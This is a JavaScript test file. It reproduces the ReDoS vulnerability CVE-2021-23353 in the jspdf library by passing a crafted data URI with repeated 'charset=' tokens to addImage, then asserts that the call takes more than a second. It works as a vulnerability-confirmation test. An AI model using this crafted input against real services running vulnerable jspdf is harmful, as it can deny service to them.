function build_blank(n) {
  var ret = "data:/";
  // for (var i = 0; i < n; i++) {
  // 	ret += "charset="
  // }
  return ret + "!";
}
//https://github.com/yetingli/PoCs/blob/main/CVE-2021-23353/jspdf.js
test("ReDos in jspdf", () => {
  const measureTime = require("./utils").measureTime;
  const fs = require("fs");
  const path = require("path");
  const { jsPDF } = require("jspdf");

  const doc = new jsPDF();
  doc.text("Hello world", 10, 10);

  let t = measureTime(function () {    
    try {
      doc.addImage("data:image/jpeg;charset=" + "charset=".repeat(22) + "!base64,", "PNG", 1, 1, 1, 1, undefined, "SLOW", 0);
    } catch(e) {

    }
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
